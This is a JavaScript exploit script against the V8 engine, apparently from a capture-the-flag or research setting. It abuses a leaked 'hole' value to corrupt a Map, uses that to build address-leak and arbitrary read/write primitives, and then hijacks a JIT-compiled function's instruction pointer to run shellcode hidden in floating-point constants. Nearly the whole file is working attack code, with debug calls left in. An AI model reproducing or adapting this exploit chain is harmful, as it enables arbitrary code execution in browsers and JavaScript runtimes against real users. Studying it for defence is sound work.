class Helpers {
    constructor() {
        this.buf = new ArrayBuffer(8);
        this.dv = new DataView(this.buf);
        this.u8 = new Uint8Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.u64 = new BigUint64Array(this.buf);
        this.f32 = new Float32Array(this.buf);
        this.f64 = new Float64Array(this.buf);

        this.roots = new Array(0x30000);
        this.index = 0;
    }

    pair_i32_to_f64(p1, p2) {
        this.u32[0] = p1;
        this.u32[1] = p2;
        return this.f64[0];
    }

    i64tof64(i) {
        this.u64[0] = i;
        return this.f64[0];
    }

    f64toi64(f) {
        this.f64[0] = f;
        return this.u64[0];
    }

    set_i64(i) {
        this.u64[0] = i;
    }

    set_l(i) {
        this.u32[0] = i;
    }

    set_h(i) {
        this.u32[1] = i;
    }

    get_i64() {
        return this.u64[0];
    }

    ftoil(f) {
        this.f64[0] = f;
        return this.u32[0]
    }

    ftoih(f) {
        this.f64[0] = f;
        return this.u32[1]
    }

    add_ref(object) {
        this.roots[this.index++] = object;
    }

    mark_sweep_gc() {
        new ArrayBuffer(0x7fe00000);
    }

    scavenge_gc() {
        for (var i = 0; i < 8; i++) {
            // fill up new space external backing store bytes
            this.add_ref(new ArrayBuffer(0x200000));
        }
        this.add_ref(new ArrayBuffer(8));
    }

    hex(i) {
        return i.toString(16).padStart(16, "0");
    }

    breakpoint() {
        this.buf.slice();
    }
}

var helper = new Helpers();

// =================== //
//     Start here!     //
// =================== //
const shellcode = () => {
    return [1.95538254221075331056310651818E-246,
        1.95606125582421466942709801013E-246,
        1.99957147195425773436923756715E-246,
        1.95337673326740932133292175341E-246,
        2.63486047652296056448306022844E-284];
}

// % PrepareFunctionForOptimization(shellcode);
// shellcode();
// % OptimizeFunctionOnNextCall(shellcode);
// shellcode();
for (let i = 0; i < 0x10000; i++) { shellcode(); shellcode(); shellcode(); shellcode(); }

let arr = new Array(1);
let hole = arr.hole();
// %DebugPrint(hole);
let map = new Map();
map.set(1, 1);
// console.log(map.size);
map.set(hole, 1);
// console.log(map.size);
map.delete(hole);
// console.log(map.size);
map.delete(hole);
// console.log(map.size);
map.delete(1);
% DebugPrint(map);
// %SystemBreak();
// console.log(map.size);
map.set(16, 1);
let victim = new Array(1.1, 2.2);

// %SystemBreak();
map.set(victim, 0xffff);
// console.log(helper.hex(helper.f64toi64(victim[0])));
// %SystemBreak();
let driver_arr = new Array(1.1, 2.2);
let victim_obj = new Array({});


function addr_of(obj) {
    victim_obj[0] = obj;
    return victim[18];
}
// let obj={};
// %DebugPrint(obj);
// let addr=addr_of(obj);
// console.log(helper.hex(helper.ftoih(addr)));
function aar(addr) {
    victim[6] = helper.pair_i32_to_f64(addr - 8, helper.ftoih(victim[6]));
    // console.log(helper.hex(helper.get_i64()));
    return driver_arr[0];
}
// let obj = {};
// % DebugPrint(obj);
// let addr = addr_of(obj);
// console.log(helper.hex(helper.f64toi64(aar(helper.ftoih(addr)))));
function aaw(addr, value) {
    victim[6] = helper.pair_i32_to_f64(addr - 8, helper.ftoih(victim[6]));
    // console.log(helper.hex(helper.get_i64()));
    driver_arr[0] = value;
}
// let obj = {};
// % DebugPrint(obj);
// let addr = addr_of(obj);
// aaw(helper.ftoih(addr), 1.1);

% DebugPrint(victim);
% DebugPrint(driver_arr);
% DebugPrint(victim_obj);
% DebugPrint(shellcode);
// % SystemBreak();
let shellcode_addr = addr_of(shellcode);
console.log(helper.hex(helper.ftoih(shellcode_addr)));
// % SystemBreak();
let code = helper.ftoil(aar(helper.ftoih(shellcode_addr) + 0x18)); // code pointer of shellcode()
console.log(helper.hex(code));
// % SystemBreak();
let inst = helper.f64toi64(aar(code + 0xC)); // instructions pointer of shellcode()
console.log(helper.hex(inst));
// % SystemBreak();
inst += 0x60n; // address of actual shellcode
aaw(code + 0xC, helper.i64tof64(inst));
// %SystemBreak();
shellcode();
// % SystemBreak();


